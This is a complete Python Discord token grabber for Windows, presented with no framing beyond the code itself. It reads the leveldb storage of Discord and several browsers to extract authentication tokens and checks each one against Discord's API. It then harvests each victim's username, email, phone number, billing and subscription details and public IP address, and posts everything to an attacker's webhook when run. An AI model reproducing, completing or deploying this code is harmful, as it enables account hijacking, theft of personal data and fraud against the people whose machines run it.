WEBHOOK_URL = ''

import os
if os.name != "nt": exit()
import json
import re
import urllib3
from urllib.request import Request, urlopen
from requests import post, get
import random
from datetime import datetime

user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20150626 Firefox/36.0',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_5) AppleWebKit/5342 (KHTML, like Gecko) Chrome/37.0.869.0 Mobile Safari/5342',
'Opera/8.11 (Windows NT 6.1; sl-SI) Presto/2.8.218 Version/12.00',
'Mozilla/5.0 (Macintosh; PPC Mac OS X 10_8_3 rv:6.0) Gecko/20130514 Firefox/36.0',
'Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Win 9x 4.90; Trident/4.1)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0 rv:4.0) Gecko/20180512 Firefox/35.0',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_4) AppleWebKit/5352 (KHTML, like Gecko) Chrome/40.0.820.0 Mobile Safari/5352',
'Opera/8.83 (X11; Linux x86_64; sl-SI) Presto/2.8.187 Version/11.00',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_3) AppleWebKit/5332 (KHTML, like Gecko) Chrome/40.0.829.0 Mobile Safari/5332',
'Opera/9.63 (X11; Linux x86_64; sl-SI) Presto/2.12.183 Version/12.00']
user_agent = random.choice(user_agents)

ip_address = get('http://checkip.amazonaws.com').content.decode('utf8')[:-2]

def GetTokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    ldb = '\\Local Storage\\leveldb'
    paths = {
        'Discord': roaming + '\\Discord' ,
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        "Vivaldi" : local + "\\Vivaldi\\User Data\\Default\\"
    }
    grabbed = {}
    token_ids = []
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        tokens = []
        for file_name in os.listdir(path + ldb):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path + ldb}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        if token in tokens:
                            pass
                        else:
                            response = post(f'https://discord.com/api/v6/invite/{random.randint(1,9999999)}', headers={'Authorization': token})
                            if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
                                pass
                            else:
                                tokenid = token[:24]
                                if tokenid in token_ids:
                                    pass
                                else:
                                    token_ids.append(tokenid)
                                    tokens.append(token)
        if len(tokens) > 0:
            grabbed[platform] = tokens
    return grabbed



def GetUsername(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()

    username = f'{info["username"]}#{info["discriminator"]}'
    return username


def GetUserId(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    userid = info['id']
    return userid

def GetEmail(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    email = info['email']
    return email

def GetPhoneNumber(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    phone_number = info['phone']
    return phone_number

def VerifiedCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    verified = info['verified']
    verified = bool(verified)
    return verified

def BillingCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
    if len(info) > 0:
        return True
    else:
        return False

def NitroCheck(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }


    has_nitro = False
    res = get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    if has_nitro:
        has_nitro = True
        end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((start - end).days)

        return has_nitro, start, end, days_left
    else:
        has_nitro = False
        return has_nitro, nitro_data

def GetLocale(token):
    languages = {
        'da'    : 'Danish, Denmark',
        'de'    : 'German, Germany',
        'en-GB' : 'English, United Kingdom',
        'en-US' : 'English, United States',
        'es-ES' : 'Spanish, Spain',
        'fr'    : 'French, France',
        'hr'    : 'Croatian, Croatia',
        'lt'    : 'Lithuanian, Lithuania',
        'hu'    : 'Hungarian, Hungary',
        'nl'    : 'Dutch, Netherlands',
        'no'    : 'Norwegian, Norway',
        'pl'    : 'Polish, Poland',
        'pt-BR' : 'Portuguese, Brazilian, Brazil',
        'ro'    : 'Romanian, Romania',
        'fi'    : 'Finnish, Finland',
        'sv-SE' : 'Swedish, Sweden',
        'vi'    : 'Vietnamese, Vietnam',
        'tr'    : 'Turkish, Turkey',
        'cs'    : 'Czech, Czechia, Czech Republic',
        'el'    : 'Greek, Greece',
        'bg'    : 'Bulgarian, Bulgaria',
        'ru'    : 'Russian, Russia',
        'uk'    : 'Ukranian, Ukraine',
        'th'    : 'Thai, Thailand',
        'zh-CN' : 'Chinese, China',
        'ja'    : 'Japanese',
        'zh-TW' : 'Chinese, Taiwan',
        'ko'    : 'Korean, Korea'
    }


    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    info = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    locale = info['locale']
    language = languages.get(locale)

    return locale, language




def SendTokens(webhook_url, tokens_grabbed = None):
    if not tokens_grabbed: tokens_grabbed = GetTokens()
    embed = [{'description' : ''}]
    tokens_info = []
    for app in list(tokens_grabbed.keys()):
        for token in tokens_grabbed[app]:
            tokens_info.append(token)
        embed[0]['description'] += f'\n```diff\n+ Grabbed From {app}\n'+ '\n\n'.join(tokens_grabbed[app]) + '\n```'
    
    for token in tokens_info:
        
        username = GetUsername(token)
        user_id = GetUserId(token)
        email = GetEmail(token)
        phone_number = GetPhoneNumber(token)
        verified_check = VerifiedCheck(token)
        billing = BillingCheck(token)
        nitro = NitroCheck(token)[0]
        locale = GetLocale(token)[0]
        language = GetLocale(token)[1]
        

        embed[0]['description'] += f'\n```diff\n+ Token Info for\n{token}\n\n'

        embed[0]['description'] += f'''Username   = {username}
User Id    = {user_id}
Ip Address = {ip_address}
Email      = {email}
Phone      = {phone_number}
Verified   = {verified_check}
Billing    = {billing}
Nitro      = {nitro}'''

        if nitro == True:
            nitrostart = NitroCheck(token)[1]
            nitroend = NitroCheck(token)[2]
            daysofnitro = NitroCheck(token)[3]
            embed[0]['description'] += f'\n\nNitro Started = {nitrostart}\nNitro Ends = {nitroend}\nDays Left = {daysofnitro}\n\n'

        embed[0]['description'] += f'''Locale     = {locale}
Language   = {language}'''


        embed[0]['description'] += '```'



    urlopen(Request(webhook_url, data=json.dumps({"embeds" : embed}).encode(), headers={'Content-Type': 'application/json','User-Agent': f'{user_agent}'}))


SendTokens(WEBHOOK_URL)
